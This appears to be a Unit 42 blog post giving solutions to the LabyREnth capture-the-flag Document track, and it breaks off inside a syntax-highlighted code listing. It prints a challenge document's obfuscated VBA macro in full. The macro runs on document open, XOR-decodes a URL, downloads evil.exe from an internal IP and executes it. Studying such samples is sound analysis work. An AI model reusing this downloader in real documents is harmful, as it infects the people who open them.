              <div class="entry-content article-description"><p>Thanks to the incredibly talented community of threat researchers that participated in <a href="https://blog.paloaltonetworks.com/2016/07/unit42-announcing-the-labyrenth-capture-the-flag-ctf-challenge/" target="_blank">LabyREnth, the Unit 42 Capture the Flag (CTF)</a> challenge. Now that the challenge is closed, we can finally reveal the solutions of each challenge track. We’ll be rolling out the solutions for one challenge track per week. First up, the Document track.</p>
<p><span id="more-17284"></span></p>
<h3>Document 1 Challenge: Maaa, why you clickz such macro?</h3>
<p><em>Challenge Created By: Tyler Halfpop </em><a href="https://twitter.com/0xtyh" target="_blank"><em>@0xtyh</em></a></p>
<p>When we open the document, we see this image that is commonly found in a lot of document malware. We also have a prompt on top to enable macros.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled1-1.png"><img class="aligncenter size-large wp-image-17287" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled1-1-500x243.png" alt="Untitled1" width="500" height="243" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled1-1-500x243.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled1-1-230x112.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled1-1-768x373.png 768w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled1-1-510x247.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled1-1-82x40.png 82w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled1-1.png 907w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>If we enable macros and have a tool like FakeNet running, then we get the following output:</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled2-1.png"><img class="aligncenter size-large wp-image-17290" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled2-1-500x208.png" alt="Untitled2" width="500" height="208" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled2-1-500x208.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled2-1-230x96.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled2-1-768x319.png 768w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled2-1-510x212.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled2-1-96x40.png 96w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled2-1.png 975w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>This looks interesting, it is trying to download an evil.exe from an RFC 1918 internal IP address 10.1.133.7. We can look at the macros using the macro viewer in Word or by dumping them with a tool like <a href="https://bitbucket.org/decalage/oletools/wiki/olevba" target="_blank">olevba from decalge</a>.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c5aa6593085884777" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
Private Function QklkhFEQNB(HGKuttPaRM As Variant, UBvkWqzieX As Integer)
Dim gsFEVmmIzO, vSHOfSrEta As String, dHLdiEqdts, eUTAbMoUIA
vSHOfSrEta = ActiveDocument.Variables("ppKzr").Value()
gsFEVmmIzO = ""
dHLdiEqdts = 1
While dHLdiEqdts &lt; UBound(HGKuttPaRM) + 2
eUTAbMoUIA = dHLdiEqdts Mod Len(vSHOfSrEta): If eUTAbMoUIA = 0 Then eUTAbMoUIA = Len(vSHOfSrEta)
gsFEVmmIzO = gsFEVmmIzO + Chr(Asc(Mid(vSHOfSrEta, eUTAbMoUIA + UBvkWqzieX, 1)) Xor CInt(HGKuttPaRM(dHLdiEqdts - 1)))
dHLdiEqdts = dHLdiEqdts + 1
Wend
QklkhFEQNB = gsFEVmmIzO
End Function
Public Function BkAIuNwQNDkohBY()
twOvwCSTPL = QklkhFEQNB(Array(5, 5, 27, 65, 89, 98, 85, 86, 71, 75, 66, 92, 95, 98, 67, 64, 89, 83, 84, 95, 26, _
78, 116, 78, 91, 5, 116, 32, 72, 2, 33, 48, 10, 29, 61, 8, 37, 20, 63, 44, 1, _
12, 62, 38, 47, 52, 99, 57, 5, 121, 89, 37, 65, 32, 32, 11, 98, 42, 58, 32, 28, _
9, 3, 117, 85, 4, 57, 10, 94, 0, 16, 8, 28, 42, 30, 121, 71, 6, 8, 9, 37, _
2, 23, 34, 21, 120, 54, 7, 40, 35, 75, 50, 87, 3, 55, 47, 99, 52, 13, 0, 42, _
30, 27, 126, 59, 3, 123, 29, 52, 44, 53, 29, 15, 50, 12, 35, 8, 48, 89, 54, 27, _
62, 28, 8, 36, 49, 119, 104, 14, 5, 64, 34, 43, 22, 71, 5, 46, 7, 66, 42, 0, _
1, 113, 97, 83, 31, 45, 95, 111, 31, 40, 51), 24)
UkIWIEtqCF = QklkhFEQNB(Array(42, 115, 2), 188)
Dim xHttp: Set xHttp = CreateObject(QklkhFEQNB(Array(116, 7, 6, 74, 60, 43, 42, 36, 64, 70, 110, 27, 28, 12, 12, 17, 23), 0))
Dim bStrm: Set bStrm = CreateObject(QklkhFEQNB(Array(15, 32, 32, 53, 35, 89, 22, 25, 65, 53, 51, 26), 176))
xHttp.Open UkIWIEtqCF, twOvwCSTPL, False
xHttp.Send
With bStrm
.Type = 1
.Open
.write xHttp.responseBody
.savetofile QklkhFEQNB(Array(20, 39, 81, 118, 52, 78, 11), 17), 2
End With
Shell (QklkhFEQNB(Array(20, 39, 81, 118, 52, 78, 11), 17))
End Function
Private Sub Document_Open()
If ActiveDocument.Variables("ppKzr").Value &lt;&gt; "toto" Then
BkAIuNwQNDkohBY
ActiveDocument.Variables("ppKzr").Value = "toto"
If ActiveDocument.ReadOnly = False Then
ActiveDocument.Save
End If
End If
End Sub</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-2">2</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-4">4</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-6">6</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-8">8</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-10">10</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-12">12</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-14">14</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-16">16</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-18">18</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-20">20</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-22">22</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-24">24</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-26">26</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-28">28</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-30">30</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-32">32</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-34">34</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-36">36</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-38">38</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-40">40</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa6593085884777-42">42</div><div class="crayon-num" data-line="crayon-5f694c5aa6593085884777-43">43</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c5aa6593085884777-1"><span class="crayon-m">Private</span><span class="crayon-h"> </span><span class="crayon-t">Function</span><span class="crayon-h"> </span><span class="crayon-e">QklkhFEQNB</span><span class="crayon-sy">(</span><span class="crayon-e">HGKuttPaRM </span><span class="crayon-st">As</span><span class="crayon-h"> </span><span class="crayon-v">Variant</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">UBvkWqzieX </span><span class="crayon-st">As</span><span class="crayon-h"> </span><span class="crayon-t">Integer</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-2"><span class="crayon-e">Dim </span><span class="crayon-v">gsFEVmmIzO</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">vSHOfSrEta </span><span class="crayon-st">As</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">dHLdiEqdts</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">eUTAbMoUIA</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-3"><span class="crayon-v">vSHOfSrEta</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">ActiveDocument</span><span class="crayon-sy">.</span><span class="crayon-e">Variables</span><span class="crayon-sy">(</span><span class="crayon-s">"ppKzr"</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">Value</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-4"><span class="crayon-v">gsFEVmmIzO</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-5"><span class="crayon-v">dHLdiEqdts</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-6"><span class="crayon-st">While</span><span class="crayon-h"> </span><span class="crayon-v">dHLdiEqdts</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-h"> </span><span class="crayon-e">UBound</span><span class="crayon-sy">(</span><span class="crayon-v">HGKuttPaRM</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">2</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-7"><span class="crayon-v">eUTAbMoUIA</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">dHLdiEqdts </span><span class="crayon-e">Mod </span><span class="crayon-e">Len</span><span class="crayon-sy">(</span><span class="crayon-v">vSHOfSrEta</span><span class="crayon-sy">)</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-st">If</span><span class="crayon-h"> </span><span class="crayon-v">eUTAbMoUIA</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-h"> </span><span class="crayon-st">Then</span><span class="crayon-h"> </span><span class="crayon-v">eUTAbMoUIA</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">Len</span><span class="crayon-sy">(</span><span class="crayon-v">vSHOfSrEta</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-8"><span class="crayon-v">gsFEVmmIzO</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">gsFEVmmIzO</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-e">Chr</span><span class="crayon-sy">(</span><span class="crayon-e">Asc</span><span class="crayon-sy">(</span><span class="crayon-e">Mid</span><span class="crayon-sy">(</span><span class="crayon-v">vSHOfSrEta</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">eUTAbMoUIA</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">UBvkWqzieX</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">Xor</span><span class="crayon-h"> </span><span class="crayon-e">CInt</span><span class="crayon-sy">(</span><span class="crayon-e">HGKuttPaRM</span><span class="crayon-sy">(</span><span class="crayon-v">dHLdiEqdts</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-9"><span class="crayon-v">dHLdiEqdts</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">dHLdiEqdts</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-10"><span class="crayon-e">Wend</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-11"><span class="crayon-v">QklkhFEQNB</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">gsFEVmmIzO</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-12"><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-t">Function</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-13"><span class="crayon-m">Public</span><span class="crayon-h"> </span><span class="crayon-t">Function</span><span class="crayon-h"> </span><span class="crayon-e">BkAIuNwQNDkohBY</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-14"><span class="crayon-v">twOvwCSTPL</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">QklkhFEQNB</span><span class="crayon-sy">(</span><span class="crayon-t">Array</span><span class="crayon-sy">(</span><span class="crayon-cn">5</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">5</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">27</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">65</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">89</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">98</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">85</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">86</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">71</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">75</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">66</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">92</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">95</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">98</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">67</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">64</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">89</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">83</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">84</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">95</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">26</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">_</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-15"><span class="crayon-cn">78</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">116</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">78</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">91</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">5</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">116</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">32</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">72</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">33</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">48</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">10</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">29</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">61</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">8</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">37</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">20</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">63</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">44</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">_</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-16"><span class="crayon-cn">12</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">62</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">38</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">47</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">52</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">99</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">57</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">5</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">121</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">89</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">37</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">65</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">32</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">32</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">11</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">98</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">42</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">58</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">32</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">28</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">_</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-17"><span class="crayon-cn">9</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">117</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">85</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">57</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">10</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">94</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">16</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">8</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">28</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">42</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">30</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">121</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">71</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">6</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">8</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">9</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">37</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">_</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-18"><span class="crayon-cn">2</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">23</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">34</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">21</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">120</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">54</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">7</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">40</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">35</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">75</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">50</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">87</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">55</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">47</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">99</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">52</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">13</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">42</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">_</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-19"><span class="crayon-cn">30</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">27</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">126</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">59</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">123</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">29</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">52</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">44</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">53</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">29</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">15</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">50</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">12</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">35</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">8</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">48</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">89</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">54</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">27</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">_</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-20"><span class="crayon-cn">62</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">28</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">8</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">36</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">49</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">119</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">104</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">14</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">5</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">64</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">34</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">43</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">22</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">71</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">5</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">46</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">7</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">66</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">42</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">_</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-21"><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">113</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">97</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">83</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">31</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">45</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">95</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span 